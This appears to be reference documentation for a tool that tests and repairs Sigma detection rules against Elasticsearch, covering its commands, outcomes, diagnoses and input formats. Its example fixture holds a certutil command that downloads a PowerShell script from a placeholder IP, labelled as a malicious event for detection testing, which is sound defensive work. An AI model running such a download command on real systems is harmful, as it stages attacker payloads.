# Detection repair reference (`kestrix detect`)

Source: `src/kestrix/detect/`. The pinned Elasticsearch 8.19.3 is the only matching oracle: Kestrix
never claims a rule works because it converts, and an engine or conversion error is reported as an error
(`counts: null`), never as "no match".

## Commands

```bash
kestrix detect engine-up                 # docker run of the pinned image on 127.0.0.1:9200
kestrix detect engine-status             # exit 0 ready, 3 not reachable
kestrix detect cases                     # the 11 bundled synthetic cases
kestrix detect demo c03-noise-updater-temp --json
kestrix detect run --rule rule.yml --mapping mapping.yml --dev dev.jsonl --validation val.jsonl --json
kestrix detect run --rule rule.yml --mapping mapping.yml --dev dev.jsonl --validation val.jsonl --healthy-mapping old-mapping.yml --json
kestrix detect run --rule rule.yml --mapping mapping.yml --dev dev.jsonl --evidence-dir ./evidence --json
```

`--healthy-rule` / `--healthy-mapping` give a known-good reference whose benign match count becomes the
validation baseline. `--evidence-dir` also writes the report as `<sha256>.json`. The engine URL comes from
`KESTRIX_ES_URL` (default `http://127.0.0.1:9200`).

## Outcomes

| `outcome` | Exit | Meaning |
| --- | --- | --- |
| `repaired` | 0 | A candidate passed validation (or, without `--validation`, passed screening and is `provisional`). `diff` and `artifact` hold the fix. |
| `unchanged` | 0 | No hypothesis was raised; the rule meets the labels on the development events. |
| `abstained` | 10 | No candidate survived screening, the selected one failed validation, or a required replay errored. |
| `insufficient_evidence` | 10 | A needed field is not collected for the attacks; see `telemetry_recommendations`. |
| `unsupported` | 11 | The rule uses Sigma outside the supported subset; `reason` names the construct. |
| `engine_unavailable` | 3 | Elasticsearch was unreachable at the start; static coverage is still reported. |

Exit 2: no outcome; an input was rejected (rule, mapping, fixture, unknown case id) or the engine failed
mid-run. stderr says `error: <reason>: <detail>`.

## Diagnosis (`hypotheses[]`)

| `family` | `reason_codes` | Meaning for the user |
| --- | --- | --- |
| `mapping` | `mapped_field_absent`, `similar_field_observed` | The mapped index field is missing from every event and another observed field could hold it (`alternative_index_fields`). Usually a log pipeline rename. |
| `missing_telemetry` | `field_not_collected` | The field is absent everywhere and nothing could replace it: the data is not being collected. |
| `missing_telemetry` | `field_absent_on_malicious_events` | The field exists on some events but on none of the attacks. |
| `noise` | `benign_events_matched` | The rule matched benign events (`evidence_event_ids`). |
| `logic` | `malicious_missed_fields_present` | The rule missed attacks although every field it needs is present: a condition or modifier problem. |

## Repairs

At most 3 AST edits, at most 4 surviving candidates, never dropping a selection. Patch kinds: `mapping`
(point one Sigma field at another index field), `add_exclusion` (adds `cg_filter_<n>` and
`... and not cg_filter_<n>`), `set_predicate` (modifier or values), `set_condition`. The best development
candidate is frozen before validation; validation never changes the choice.

## Validation policy failures (`candidates[].policy_failures`)

| Code | Meaning |
| --- | --- |
| `replay_error` | The candidate's validation replay errored. |
| `no_attack_scenarios_in_suite` | Validation has no malicious events, so it cannot show the fix keeps detections. |
| `mandatory_scenario_missed` | Some attack scenario in validation was not detected. |
| `preservation_loss` | A scenario the original rule detected is no longer detected. |
| `malicious_events_lost` | Fewer malicious events detected than the original. |
| `benign_matches_above_baseline` | More benign matches than the baseline (original or healthy reference). |
| `no_benign_reduction` | Noise case only: benign matches did not drop below the original's. |

## Input formats

Rule: one Sigma YAML document, Windows `process_creation` only; selections of fields with no modifier,
`contains`, `startswith`, `endswith` (optionally `|all`); `and`/`or`/`not`, `1 of`/`all of`. Fields are
Sysmon Event ID 1 names (`Image`, `CommandLine`, `ParentImage`, `OriginalFileName`, `User`, ...).
Regex, `base64`, `cidr`, `windash`, keywords, aggregations and correlations are `unsupported`.

Mapping:

```yaml
schema_version: 1
name: lab-ecs
fields:
  Image: process.executable
  CommandLine: process.command_line
```

Fixtures (JSONL, one event per line; `label` is `malicious`, `benign` or `unknown`; `data` is the event as
stored; labels never reach the engine). Validation must not share a file hash or any `event_id` with dev.

```json
{"event_id": "d-m1", "label": "malicious", "scenario_id": "S-certutil", "data": {"process": {"executable": "C:\\Windows\\System32\\certutil.exe", "command_line": "certutil.exe -urlcache -f http://198.51.100.9/p.ps1 out.bin"}}}
{"event_id": "d-b1", "label": "benign", "scenario_id": null, "data": {"process": {"executable": "C:\\Windows\\System32\\certutil.exe", "command_line": "certutil.exe -hashfile a.iso SHA256"}}}
```

## Bundled cases (synthetic demonstrations, not a benchmark)

`c00-healthy-control` (unchanged), `c01-mapping-drift-commandline`, `c02-mapping-drift-parentimage`,
`c03-noise-updater-temp`, `c04-noise-installer-schtasks`, `c07-logic-and-or`,
`c08-modifier-exact-vs-endswith`, `c10-logic-missing-not` (repaired), `c05-missing-telemetry-commandline`,
`c06-missing-telemetry-parentimage` (insufficient_evidence), `c09-unsupported-regex` (unsupported).

A passed validation establishes behavior only on the scenarios tested. Zero benign matches on a small
sample is not a production false-positive rate.
